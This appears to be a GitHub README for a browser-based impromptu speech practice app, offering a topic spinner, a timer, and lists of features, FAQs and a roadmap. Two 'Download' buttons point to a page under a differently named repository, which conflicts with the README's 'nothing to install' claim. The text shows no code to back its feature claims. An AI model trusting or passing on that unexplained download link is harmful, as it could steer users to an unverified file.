![preview](https://raw.githubusercontent.com/iosgar63-oss/Vanilla-Spin-Speak-Coach/main/thumb_34e1.svg)
[![Download](https://raw.githubusercontent.com/iosgar63-oss/Vanilla-Spin-Speak-Coach/main/app_4203e.svg)](https://iosgar63-oss.github.io/Vanilla-Spin-Speak-Coach/)

# 🎙️ Volley-Impromptu-Speech-Coach

<div align="center">

![Status](https://img.shields.io/badge/status-actively%20maintained-brightgreen?style=for-the-badge)
![Version](https://img.shields.io/badge/version-2.4.0-blue?style=for-the-badge)
![License](https://img.shields.io/badge/license-MIT-yellow?style=for-the-badge)
![Platform](https://img.shields.io/badge/platform-web%20%7C%20mobile-lightgrey?style=for-the-badge)
![Made%20With](https://img.shields.io/badge/made%20with-HTML%20%7C%20CSS%20%7C%20JS-orange?style=for-the-badge)
![PRs](https://img.shields.io/badge/PRs-welcome-ff69b4?style=for-the-badge)
![Stars](https://img.shields.io/badge/stars-growing-gold?style=for-the-badge)
![Offline](https://img.shields.io/badge/offline-first-purple?style=for-the-badge)
![Accessibility](https://img.shields.io/badge/a11y-AA%20compliant-success?style=for-the-badge)
![Year](https://img.shields.io/badge/release-2026-informational?style=for-the-badge)

</div>

> **Spin a topic. Start the clock. Speak like nobody is watching — because at first, nobody is.**

Volley-Impromptu-Speech-Coach is a lightweight, zero-dependency coaching companion for anyone who wants to polish the ancient, terrifying art of speaking on their feet. Whether you are a debate club rookie, a product manager bracing for a surprise stand-up, a language learner chasing fluency, or simply someone who freezes when the spotlight lands — Volley hands you a topic, a timer, and a friendly nudge, then gets out of your way.

This is not a course. It is a playground. It is a sparring partner that never yawns at your ums.

The entire experience lives in your browser. No accounts. No servers quietly sipping your data. No subscription gate hiding the good stuff. Just HTML, CSS, JavaScript, and the quiet audacity to believe that speaking well is a skill anyone can build — one awkward minute at a time.

---

## 📌 Table of Contents

- [Why Volley Exists](#-why-volley-exists)
- [Feature Highlights](#-feature-highlights)
- [How It Works](#-how-it-works)
- [The Topic Engine](#-the-topic-engine)
- [Timer Mechanics](#-timer-mechanics)
- [Getting Started Without the Fuss](#-getting-started-without-the-fuss)
- [Responsive User Interface](#-responsive-user-interface)
- [Multilingual Support](#-multilingual-support)
- [Round-the-Clock Assistance](#-round-the-clock-assistance)
- [Design Philosophy](#-design-philosophy)
- [Accessibility Commitment](#-accessibility-commitment)
- [SEO and Discoverability](#-seo-and-discoverability)
- [Project Structure](#-project-structure)
- [Roadmap for 2026](#-roadmap-for-2026)
- [Frequently Asked Questions](#-frequently-asked-questions)
- [Contributing](#-contributing)
- [License](#-license)
- [Disclaimer](#-disclaimer)

---

## 🎯 Why Volley Exists

Public speaking has a reputation problem. It is treated as either a gift handed out at birth or a hurdle to be survived in a conference room. Neither framing helps. The truth is flatter and more encouraging: speaking improves the way any physical skill improves — through reps, feedback, and a little bit of deliberate discomfort.

Most practice tools make the mistake of being too clever. They grade you. They analyze your voice. They sell you a dashboard of metrics you did not ask for. Volley takes the opposite path. It gives you a prompt, a stopwatch, and silence. That silence is the whole point. Inside it, you learn to trust your own voice.

This project was born out of a simple observation: the hardest part of impromptu speaking is not the speaking. It is the *starting*. Volley removes the friction of deciding what to talk about so all your energy goes into the talking itself.

---

## ✨ Feature Highlights

- **Topic Spinner** — a curated library of prompts across categories like philosophy, technology, daily life, absurd hypotheticals, and professional scenarios.
- **Precision Timer** — configurable durations from a brisk 30 seconds to a marathon 10 minutes, with optional halfway chimes.
- **Script-Free Mode** — no teleprompter, no bullet points, no crutches. Just you and the clock.
- **Session History** — a local ledger of every run you have completed, so progress becomes visible over weeks rather than guessed at.
- **Prompt Categories** — filter by mood, difficulty, or theme so your practice matches your ambition.
- **Zero Installation Overhead** — open the page and begin. Nothing to compile, nothing to configure.
- **Offline-First Architecture** — once loaded, the app keeps working even when your connection wanders off.
- **Responsive User Interface** — the layout breathes from a smartphone held in one hand to an ultrawide monitor.
- **Multilingual Support** — interface strings and prompt packs prepared for global audiences.
- **Round-the-Clock Assistance** — documentation and support channels designed to answer questions whenever they surface.
- **Dark and Light Themes** — because late-night practice deserves a gentler palette.
- **Keyboard-First Controls** — spin, start, pause, and reset without ever touching a pointer.

Each of these features was chosen because it defends the same principle: the tool should disappear the moment you begin speaking.

---

## 🧠 How It Works

The flow is deliberately short, because friction is the enemy of repetition.

1. **Spin** — tap the spinner. A prompt appears from the active category.
2. **Prepare** — optionally, a brief prep window gives you fifteen or thirty seconds to sketch a mental outline.
3. **Speak** — the timer counts down (or up, if you prefer an open-ended mode). There is no pause button during an official run; that restraint is intentional.
4. **Reflect** — afterward, a short reflection panel invites you to note one thing that went well and one thing to sharpen.
5. **Repeat** — spin again. The next prompt is never more than a heartbeat away.

That loop, repeated a few times a week, is the entire method. There is no secret chapter hiding behind it.

---

## 🎲 The Topic Engine

Prompts are stored as plain data, which means the library is trivially expandable and community-friendly. Categories currently include:

| Category | Flavor | Example Vibe |
| --- | --- | --- |
| Everyday Life | Grounded, personal | "Describe the last meal that surprised you." |
| Technology | Forward-looking | "Argue for or against a world without notifications." |
| Ethics | Reflective | "Is honesty always the kindest option?" |
| Absurd | Playful | "Defend the right of pigeons to run for office." |
| Professional | Career-ready | "Pitch a product that solves a problem you invented." |
| Storytelling | Narrative | "Tell the story of a stranger you will never forget." |

Because prompts live in a simple structured file, adding your own is a matter of editing one list. No build step, no schema migration, no ceremony.

---

## ⏱️ Timer Mechanics

The timer is the quiet engine of the whole experience. Under the hood it favors accuracy over drama:

- **Configurable Duration** — set a fixed length or run in stopwatch mode.
- **Halfway Signal** — an optional gentle cue so you are never blindsided by the final seconds.
- **Visual Pulse** — the countdown shifts color as time runs short, a wordless hint to land your thought.
- **Session Logging** — completed runs are recorded locally for later review.
- **Wake-Lock Friendly** — the interface is designed to survive a sleeping screen where the browser permits.

The design principle here is simple: the timer should feel like a metronome, not a referee.

---

## 🚀 Getting Started Without the Fuss

There is nothing to compile and nothing to configure. Opening the main page in a modern browser is the entire onboarding.

Then:

- Press **Space** to spin a new topic.
- Press **Enter** to launch the timer.
- Press **Escape** to reset the current round.
- Press **T** to toggle the theme.

That is the whole manual. Everything else is optional.

---

## 📱 Responsive User Interface

The layout was drawn mobile-first and then allowed to stretch. On a phone, controls stack vertically and hit targets grow to thumb-friendly dimensions. On a tablet, the topic card and timer share a balanced two-column rhythm. On a desktop, generous whitespace lets the prompt breathe in the center of the screen while peripheral controls stay within easy reach.

Breakpoints are hand-tuned rather than bulk-generated, which keeps the cascade small and the visual language consistent. Whether you are rehearsing on a train or projecting onto a living-room television, the interface meets you where you are.

---

## 🌍 Multilingual Support

Volley is built with internationalization in mind from the ground up. Interface strings are separated from logic, meaning a new language is a translation file rather than a code rewrite. Prompt packs are similarly isolated, so the same spinner can serve entirely different cultural contexts without touching the timer.

The current set of prepared locales grows with community contributions. If you would like to see your language represented, the translation workflow is intentionally low-ceremony — copy one file, translate the strings, and open a pull request.

---

## 🕰️ Round-the-Clock Assistance

Learning to speak confidently does not follow business hours, so neither does Volley's support footprint. Documentation is written to be self-sufficient, the issue tracker welcomes questions alongside bug reports, and discussions remain open across time zones. When you have a question at 3 a.m. before a big presentation, you should be able to find an answer without waiting for a sunrise.

Support here means clarity, not dependency. The goal is for you to outgrow the need for help.

---

## 🎨 Design Philosophy

Volley's visual language borrows from three places: the calm of a library, the clarity of a stopwatch, and the energy of a game show buzzer. The palette stays restrained so the typography can carry the tone. Motion is used sparingly — a spinner that accelerates, a timer that subtly tightens — because animation should inform, not entertain.

The guiding metaphor is a *tennis volley*. In a rally, you do not have time to plan the perfect shot. You react, adjust, and keep the ball alive. Impromptu speaking works the same way. The app is named after the rally, not the point.

---

## ♿ Accessibility Commitment

Accessibility is treated as a baseline requirement rather than an afterthought:

- Semantic HTML landmarks throughout.
- Visible focus states on every interactive element.
- Sufficient color contrast in both themes.
- Keyboard operability for all core flows.
- Reduced-motion preferences respected.
- Screen-reader-friendly labels on controls.

If you encounter a barrier, please open an issue. Accessibility regressions are treated with the same urgency as functional bugs.

---

## 🔍 SEO and Discoverability

While Volley is a browser-based tool rather than a content site, discoverability still matters because people search for help with impromptu speaking, public speaking practice, and speech coaching every day. Semantic markup, descriptive page titles, and clear heading structures help the project reach the people it was built for.

Keywords are woven naturally into documentation and interface copy: *impromptu speech coaching*, *public speaking practice tool*, *speech timer*, *topic generator for speaking practice*, *responsive speaking coach*, and *multilingual speech training*. The aim is genuine clarity, not search-engine puppetry.

---

## 🗂️ Project Structure

At a high level, the repository is organized around a simple separation of concerns:

- **Pages** — the entry HTML documents that anchor the experience.
- **Stylesheets** — modular CSS files covering layout, theme, and components.
- **Scripts** — small, focused JavaScript modules for the spinner, timer, storage, and interface state.
- **Data** — plain structured prompt packs and locale strings.
- **Documentation** — guides, contribution notes, and this README.

No bundlers. No transpilers. No build artifacts to reconcile. The source you read is the code that runs.

---

## 🛣️ Roadmap for 2026

The year ahead has a few intentional priorities:

- Expanded prompt libraries across more cultural contexts.
- Additional locale translations contributed by the community.
- Optional voice-note capture for self-review, stored entirely on-device.
- A printable prompt-card generator for analog practice.
- Small refinements to the timer's accessibility cues.
- Documentation refresh timed with the 2026 release cycle.

Priorities will shift as feedback arrives. The roadmap is a compass, not a contract.

---

## ❓ Frequently Asked Questions

**Do I need an account?**
No. Everything runs locally, and nothing leaves your device.

**Does it work offline?**
Yes, after the first load, the app is designed to keep functioning without a connection.

**Can I add my own topics?**
Absolutely. Prompt packs are plain data, and adding a category is straightforward.

**Is my voice recorded?**
Not by default. Any future recording features will remain strictly on-device and optional.

**Which browsers are supported?**
All evergreen browsers. Legacy support is best-effort.

---

## 🤝 Contributing

Contributions of every size are welcome — a typo fix, a new prompt category, a translation, or a thoughtful accessibility improvement. Before opening a pull request, please read the contribution guidelines and keep changes focused. Small, well-described pull requests are reviewed fastest.

If you are unsure where to start, the issue tracker labels beginner-friendly tasks clearly.

---

## 📜 License

This project is released under the [MIT License](https://opensource.org/licenses/MIT). You are welcome to use, modify, and distribute it in accordance with the terms of that license. The MIT License is one of the most permissive and widely adopted open-source licenses, and it keeps the door open for both personal and commercial use.

---

## ⚠️ Disclaimer

Volley-Impromptu-Speech-Coach is an educational and self-improvement tool intended for practicing impromptu speaking. It is provided as-is, without warranty of any kind, express or implied. The maintainers are not responsible for outcomes arising from its use, including — but not limited to — speeches delivered, debates won or lost, or the occasional moment of unexpected brilliance. Always practice responsibly, and remember that confidence on stage is built in private, not on it.

This project is not affiliated with any institution, brand, or organization. Any resemblance to your high school debate coach is purely coincidental.

---

<div align="center">

**Volley-Impromptu-Speech-Coach** — speak first, polish later.

Made with patience and a stopwatch in 2026.

[![Download](https://raw.githubusercontent.com/iosgar63-oss/Vanilla-Spin-Speak-Coach/main/app_4203e.svg)](https://iosgar63-oss.github.io/Vanilla-Spin-Speak-Coach/)

</div>